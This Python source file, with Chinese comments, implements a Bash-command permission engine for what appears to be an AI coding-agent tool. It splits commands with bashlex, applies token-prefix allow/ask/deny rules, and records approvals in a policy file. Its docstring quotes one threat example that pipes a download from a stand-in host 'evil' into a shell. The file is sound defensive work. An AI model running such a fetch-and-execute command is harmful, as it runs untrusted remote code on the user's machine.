"""Bash 命令权限的 AST 拆解与 token 规则引擎（P0-4，codex execpolicy 同构）。

**顶层叶模块**：amend_policy（审批回写）由平台侧 approve.py 调用——进程
边界铁律（webui 不入 loadn.core），与 truststore 同款布局。

威胁（A5 实证）：旧首行 fnmatch（"Bash:git *"）对整串匹配——
`git status && curl evil | sh` 命中 allow 前缀即放行，恶意载荷藏在
白名单前缀的复合结构里。

分层：
- 拆解 `split_subcommands(cmd)`：bashlex（**可选 extras `loadn[ast]`**，
  单依赖红线不破）解析 → 复合命令展开为子命令 token 序列（codex
  word-only 白名单同构：仅 command/list/operator/pipeline/pipe/word；
  重定向/命令替换/procsub/参数展开/compound 等不可静态判定的构造 →
  None = fail-closed 按未知处理）。无 bashlex → None（调用方降级旧
  fnmatch 并标 policy:degraded）。
- 规则 `BashRule`：有序 token 前缀（首 token 锚定，余位支持备选集），
  三档决策 allow/ask/deny + justification（审批/拒绝文案回流）。JSON：
  `{"prefix": ["git", ["status","diff"]], "decision": "allow", "justification":
  "只读 git", "match": [...], "not_match": [...]}`。
- 自测：match/not_match 样例加载期评估——不符即配置错误（ValueError），
  调用方拒载该源全部规则（execpolicy 规则自测同构）。
- 评估 `evaluate(rules, subcommands)`：逐子命令、逐规则，命中取**最严者
  胜**（deny > ask > allow），无命中 = ask（headless 侧即拒）。
"""
from __future__ import annotations

from dataclasses import dataclass, field

try:
    import bashlex  # 可选 extras loadn[ast]
    HAVE_BASHLEX = True
except ImportError:         # pragma: no cover - 环境依赖
    HAVE_BASHLEX = False

# word-only 白名单（codex bash.rs 同构）：其余节点 kinds 一律 None
_SAFE_KINDS = {"command", "list", "operator", "pipeline", "pipe", "word"}
# word 节点内的运行期展开：内容不可静态判定 → fail-closed
_UNSAFE_EXPANSIONS = ("commandsubstitution", "processsubstitution",
                      "arithmetic", "parameter")

SEVERITY = {"allow": 0, "ask": 1, "deny": 2}
DECISIONS = ("allow", "ask", "deny")


# ---------------------------------------------------------------- 拆解
def split_subcommands(cmd: str) -> list[list[str]] | None:
    """复合命令 → 子命令 token 序列；不可静态判定/解析失败 → None。

    返回空列表 = 空命令（调用方自行处理）；None = fail-closed。
    """
    if not HAVE_BASHLEX or not cmd.strip():
        return None
    try:
        trees = bashlex.parse(cmd)
    except Exception:                                   # noqa: BLE001
        return None     # bashlex 对不少合法语法也会炸：一律按不可判定
    out: list[list[str]] = []
    for tree in trees:
        subs = _walk(tree)
        if subs is None:
            return None
        out.extend(s for s in subs if s)
    return out if out else None


def _walk(node) -> list[list[str]] | None:
    """收集该子树的**子命令** token 列表（每个 command 节点一条——
    复合结构 `a && b`/`a | b` 展开为两条，绝不分摊平成一条 token 流）。

    返回 None = 遇不可静态判定构造。word 节点带 parts（命令替换挂在这）
    或非空 expansion 一律拒绝（实测 bashlex 把 $(x) 放 word.parts）。
    """
    if node.kind in ("list", "operator", "pipeline", "pipe"):
        out: list[list[str]] = []
        for part in getattr(node, "parts", []) or []:
            sub = _walk(part)
            if sub is None:
                return None
            out.extend(sub)
        return out
    if node.kind == "command":
        words: list[str] = []
        for part in getattr(node, "parts", []) or []:
            if part.kind != "word":
                return None              # assignment/redirect 挂在 command 内
            if getattr(part, "parts", None) or \
                    any(getattr(e, "type", "") in _UNSAFE_EXPANSIONS
                        for e in (getattr(part, "expansion", []) or [])):
                return None              # word 内嵌替换/展开
            words.append(part.word)
        return [words] if words else None
    return None                          # 其余 kinds（compound/redirect/…）一律拒


# ---------------------------------------------------------------- 规则
@dataclass
class BashRule:
    prefix: list                          # ["git", ["status","diff"], ...]
    decision: str = "ask"                 # allow | ask | deny
    justification: str = ""               # 审批 UI / 拒绝文案回流
    source: str = ""                      # 来源标记（settings/policy/审批回写）
    match: list[str] = field(default_factory=list)       # 自测应命中
    not_match: list[str] = field(default_factory=list)   # 自测不应命中

    def __post_init__(self) -> None:
        if not self.prefix or not isinstance(self.prefix, list) \
                or not all(isinstance(t, (str, list)) for t in self.prefix):
            raise ValueError(f"prefix 需为非空 token 数组（str 或备选数组）："
                             f"{self.prefix!r}")
        if self.decision not in DECISIONS:
            raise ValueError(f"decision 需为 {'|'.join(DECISIONS)}："
                             f"{self.decision!r}")

    def applies_to(self, tokens: list[str]) -> bool:
        """有序前缀匹配：首 token 锚定，余位逐位（备选集=任一）。"""
        if len(tokens) < len(self.prefix):
            return False
        for pat, tok in zip(self.prefix, tokens):
            if isinstance(pat, list):
                if tok not in pat:
                    return False
            elif pat != tok:
                return False
        return True

    def self_test(self) -> None:
        """加载期自测：match 样例必须命中、not_match 必须不命中。"""
        for sample in self.match:
            toks = sample.split()
            if not self.applies_to(toks):
                raise ValueError(f"规则自测失败：{sample!r} 应命中 {self.prefix!r}")
        for sample in self.not_match:
            toks = sample.split()
            if self.applies_to(toks):
                raise ValueError(f"规则自测失败：{sample!r} 不应命中 {self.prefix!r}")


def parse_rules(raw: list) -> list[BashRule]:
    """JSON 数组 → BashRule 列表（含自测；任一失败抛 ValueError=整源拒载）。"""
    if not isinstance(raw, list):
        raise ValueError("bash_rules 需为数组")
    rules = []
    for i, item in enumerate(raw):
        if not isinstance(item, dict):
            raise ValueError(f"bash_rules[{i}] 需为对象")
        try:
            r = BashRule(
                prefix=item.get("prefix") or [],
                decision=str(item.get("decision") or "ask"),
                justification=str(item.get("justification") or ""),
                source=str(item.get("source") or ""),
                match=[str(x) for x in item.get("match") or []],
                not_match=[str(x) for x in item.get("not_match") or []])
        except ValueError as e:
            raise ValueError(f"bash_rules[{i}]: {e}") from None
        r.self_test()
        rules.append(r)
    return rules


# ---------------------------------------------------------------- 评估
@dataclass
class BashVerdict:
    decision: str                          # allow | ask | deny
    reason: str = ""                       # 命中说明（含 justification）
    degraded: bool = False                 # 无 bashlex 的降级标注


def evaluate(rules: list[BashRule], cmd: str) -> BashVerdict:
    """整命令裁决：逐子命令取命中规则的最严者，再跨子命令取最严。

    - 可拆解 → 子命令 token 序列逐个评估（无命中的子命令=ask）
    - bashlex 在但**不可静态判定**（重定向/替换/展开）→ ask（fail-closed：
      拆不了就不按规则放行）
    - 无 bashlex（degraded 模式）→ 空白切词近似评估，标 degraded
    """
    subs = split_subcommands(cmd)
    if subs is None:
        if HAVE_BASHLEX:
            return BashVerdict("ask", "命令含不可静态判定的构造"
                                      "（重定向/命令替换/参数展开）")
        worst: BashVerdict | None = None
        for tokens in (cmd.split(),):
            v = _best(rules, tokens) or BashVerdict("ask", "")
            if worst is None or SEVERITY[v.decision] > SEVERITY[worst.decision]:
                worst = v
        assert worst is not None
        return BashVerdict(worst.decision, worst.reason, degraded=True)
    worst = None
    for tokens in subs:
        v = _best(rules, tokens) or BashVerdict("ask", "")
        if worst is None or SEVERITY[v.decision] > SEVERITY[worst.decision]:
            worst = v
    assert worst is not None
    return worst


def _best(rules: list[BashRule], tokens: list[str]) -> BashVerdict | None:
    """单子命令：全部命中规则取最严；无命中 None。"""
    hit: BashVerdict | None = None
    for r in rules:
        if not r.applies_to(tokens):
            continue
        note = r.justification or ""
        v = BashVerdict(r.decision,
                        f"规则 {r.prefix!r}={r.decision}"
                        + (f"（{note}）" if note else ""))
        if hit is None or SEVERITY[v.decision] > SEVERITY[hit.decision]:
            hit = v
    return hit


# ---------------------------------------------------------------- 审批回写（P0-4b）
POLICY_VERSION = 1


def policy_path(cwd):
    from pathlib import Path as _P
    return _P(cwd) / ".loadn" / "policy.json"


def _read_policy(path) -> dict:
    """读 policy.json；缺失/坏文件 → 空 v1 骨架（迁移语义：无文件即新建）。"""
    import json as _json
    try:
        data = _json.loads(path.read_text(encoding="utf-8"))
        if isinstance(data, dict) and isinstance(data.get("bash_rules"), list):
            return data
    except (OSError, ValueError):
        pass
    return {"version": POLICY_VERSION, "bash_rules": []}


def amend_policy(cwd, prefix: list, decision: str = "allow",
                 justification: str = "", source: str = "approval") -> dict:
    """审批回写一条 token 规则到 .loadn/policy.json（codex amend.rs 同构）。

    - flock 互斥（多审批并发回写不丢更新）+ tmp/rename 原子落盘
    - 幂等：同 prefix 已存在 → 更新 decision/justification（不重复条目）
    - 迁移：文件不存在/坏 JSON → 以 v1 骨架重建（坏文件内容丢弃并告警）
    - 写入的规则经 parse_rules 全量校验（自测失败=拒写，fail-closed）
    返回写入的规则 dict。
    """
    import fcntl
    import json as _json
    import os as _os
    import tempfile

    from loadn.util import get_logger

    path = policy_path(cwd)
    path.parent.mkdir(parents=True, exist_ok=True)
    lock = path.with_suffix(".lock")
    with open(lock, "w") as lf:
        fcntl.flock(lf, fcntl.LOCK_EX)          # codex amend.rs flock 同构
        try:
            data = _read_policy(path)
            if not path.exists() and data["bash_rules"] == []:
                pass                             # 新建（迁移）
            elif not path.exists():
                get_logger(__name__).warning(
                    "policy.json 不可读，已按 v1 骨架重建：%s", path)
            rule = {"prefix": prefix, "decision": decision,
                    "justification": justification, "source": source}
            # 幂等合并：同 prefix 替换（保序）
            rules = [r for r in data["bash_rules"]
                     if not (isinstance(r, dict) and r.get("prefix") == prefix)]
            rules.append(rule)
            data["version"] = POLICY_VERSION
            data["bash_rules"] = rules
            parse_rules(data["bash_rules"])      # 全量校验+自测，失败即拒写
            fd, tmp = tempfile.mkstemp(dir=str(path.parent), suffix=".tmp")
            with _os.fdopen(fd, "w", encoding="utf-8") as f:
                f.write(_json.dumps(data, ensure_ascii=False, indent=2) + "\n")
            _os.replace(tmp, path)
            return rule
        finally:
            fcntl.flock(lf, fcntl.LOCK_UN)
